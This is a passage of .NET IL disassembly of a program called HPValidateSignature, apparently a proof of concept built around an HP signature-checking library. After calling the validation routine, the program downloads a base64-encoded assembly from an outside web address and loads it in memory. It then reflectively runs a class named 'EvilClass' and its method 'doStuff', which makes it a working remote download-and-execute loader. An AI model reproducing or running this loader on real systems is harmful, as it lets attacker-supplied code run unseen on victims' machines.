    IL_0082:  ldarg.1
    IL_0083:  ldarg.2
    IL_0084:  ldc.i4.0
    IL_0085:  ldarg.s    bytesRead
    IL_0087:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::TransformFinalBlock(uint8[],
                                                                                                                    int32,
                                                                                                                    int32)
    IL_008c:  pop
    IL_008d:  br.s       IL_009c

    IL_008f:  ldarg.1
    IL_0090:  ldarg.2
    IL_0091:  ldc.i4.0
    IL_0092:  ldarg.s    bytesRead
    IL_0094:  ldarg.2
    IL_0095:  ldc.i4.0
    IL_0096:  callvirt   instance int32 [mscorlib]System.Security.Cryptography.HashAlgorithm::TransformBlock(uint8[],
                                                                                                             int32,
                                                                                                             int32,
                                                                                                             uint8[],
                                                                                                             int32)
    IL_009b:  pop
    IL_009c:  ldloc.s    num5
    IL_009e:  ldarg.s    bytesRead
    IL_00a0:  sub
    IL_00a1:  stloc.s    num5
    IL_00a3:  ldloc.s    num5
    IL_00a5:  ldc.i4.0
    IL_00a6:  bgt.s      IL_006c

    IL_00a8:  ret
  } // end of method SignedObject::PeHash

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       54 (0x36)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.5
    IL_0002:  newarr     [mscorlib]System.Byte
    IL_0007:  dup
    IL_0008:  ldtoken    field valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=5' '<PrivateImplementationDetails>'::'9E3E23A6EADD13E71A891894CBBF817811C47B33'
    IL_000d:  call       void [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(class [mscorlib]System.Array,
                                                                                                        valuetype [mscorlib]System.RuntimeFieldHandle)
    IL_0012:  stfld      uint8[] HPValidateSignature.SignedObject::sha1Oid
    IL_0017:  ldarg.0
    IL_0018:  ldc.i4.s   9
    IL_001a:  newarr     [mscorlib]System.Byte
    IL_001f:  dup
    IL_0020:  ldtoken    field valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=9' '<PrivateImplementationDetails>'::'727B1D2687E7034906AD71DCF56066D1228B85DE'
    IL_0025:  call       void [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(class [mscorlib]System.Array,
                                                                                                        valuetype [mscorlib]System.RuntimeFieldHandle)
    IL_002a:  stfld      uint8[] HPValidateSignature.SignedObject::sha256Oid
    IL_002f:  ldarg.0
    IL_0030:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0035:  ret
  } // end of method SignedObject::.ctor

} // end of class HPValidateSignature.SignedObject

.class private auto ansi beforefieldinit HPValidateSignature.Program
       extends [mscorlib]System.Object
{
  .method private hidebysig static void  Main(string[] args) cil managed
  {
    .entrypoint
    // Code size       31 (0x1f)
    .maxstack  8
    IL_0000:  newobj     instance void HPValidateSignature.SignedObject::.ctor()
    IL_0005:  ldstr      "C:\\Users\\b\\Desktop\\TPJC_loadassembly.dll"
    IL_000a:  callvirt   instance valuetype [HP.Common.System]HP.Common.System.Security.SignedObjRet HPValidateSignature.SignedObject::ValidatePeSignature(string)
    IL_000f:  box        [HP.Common.System]HP.Common.System.Security.SignedObjRet
    IL_0014:  call       void [mscorlib]System.Console::WriteLine(object)
    IL_0019:  call       void HPValidateSignature.Program::callLoad()
    IL_001e:  ret
  } // end of method Program::Main

  .method private hidebysig static void  callLoad() cil managed
  {
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldstr      "http://nationalinsuranceprograms.com/arm-dll-b64"
    IL_0005:  call       void HPValidateSignature.Program::LoadAndInvoke(string)
    IL_000a:  ret
  } // end of method Program::callLoad

  .method private hidebysig static void  LoadAndInvoke(string u) cil managed
  {
    // Code size       95 (0x5f)
    .maxstack  6
    .locals init ([0] string url,
             [1] class [mscorlib]System.Type t,
             [2] object o,
             [3] object[] parms)
    IL_0000:  ldarg.0
    IL_0001:  stloc.0
    IL_0002:  newobj     instance void [System]System.Net.WebClient::.ctor()
    IL_0007:  ldloc.0
    IL_0008:  call       instance string [System]System.Net.WebClient::DownloadString(string)
    IL_000d:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0012:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0017:  ldstr      "EvilClass"
    IL_001c:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Reflection.Assembly::GetType(string)
    IL_0021:  stloc.1
    IL_0022:  ldloc.1
    IL_0023:  ldstr      "doStuff"
    IL_0028:  ldc.i4.1
    IL_0029:  newarr     [mscorlib]System.Type
    IL_002e:  dup
    IL_002f:  ldc.i4.0
    IL_0030:  ldtoken    [mscorlib]System.String
    IL_0035:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_003a:  stelem.ref
    IL_003b:  callvirt   instance class [mscorlib]System.Reflection.MethodInfo [mscorlib]System.Type::GetMethod(string,
                                                                                                                class [mscorlib]System.Type[])
    IL_0040:  ldloc.1
    IL_0041:  call       object [mscorlib]System.Activator::CreateInstance(class [mscorlib]System.Type)
    IL_0046:  stloc.2
    IL_0047:  ldc.i4.1
    IL_0048:  newarr     [mscorlib]System.Object
    IL_004d:  stloc.3
    IL_004e:  ldloc.3
    IL_004f:  ldc.i4.0
    IL_0050:  ldstr      "blar"
    IL_0055:  stelem.ref
    IL_0056:  ldloc.2
    IL_0057:  ldloc.3
    IL_0058:  callvirt   instance object [mscorlib]System.Reflection.MethodBase::Invoke(object,
                                                                                        object[])
    IL_005d:  pop
    IL_005e:  ret
  } // end of method Program::LoadAndInvoke

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method Program::.ctor

} // end of class HPValidateSignature.Program

.class private auto ansi sealed '<PrivateImplementationDetails>'
       extends [mscorlib]System.Object
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .class explicit ansi sealed nested private '__StaticArrayInitTypeSize=5'
         extends [mscorlib]System.ValueType
  {
    .pack 1
    .size 5
  } // end of class '__StaticArrayInitTypeSize=5'

  .class explicit ansi sealed nested private '__StaticArrayInitTypeSize=9'
         extends [mscorlib]System.ValueType
  {
    .pack 1
    .size 9
  } // end of class '__StaticArrayInitTypeSize=9'

  .field static assembly initonly valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=9' '1A39764B112685485A5BA7B2880D878B858C1A7A' at I_000079D4
  .field static assembly initonly int64 '5D4E64280317F7B034DACEC722CBA3313FF30357' at I_000079E4
  .field static assembly initonly valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=9' '727B1D2687E7034906AD71DCF56066D1228B85DE' at I_000079EC
  .field static assembly initonly valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=5' '9E3E23A6EADD13E71A891894CBBF817811C47B33' at I_000079FC
} // end of class '<PrivateImplementationDetails>'


// =============================================================

.data cil I_000079D4 = bytearray (
                 2A 86 48 86 F7 0D 01 07 02)                      // *.H......
.data cil I_000079DD = int8[3]
.data cil I_000079E4 = bytearray (
                 2A 86 48 86 F7 0D 02 05)                         // *.H.....
.data cil I_000079EC = bytearray (
                 60 86 48 01 65 03 04 02 01)                      // `.H.e....
.data cil I_000079F5 = int8[3]
.data cil I_000079FC = bytearray (
                 2B 0E 03 02 1A)                                  // +....
// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file C:\Users\b\Documents\Visual Studio 2017\Projects\HPValidateSignature\HPValidateSignature\HPValidateSignature.res
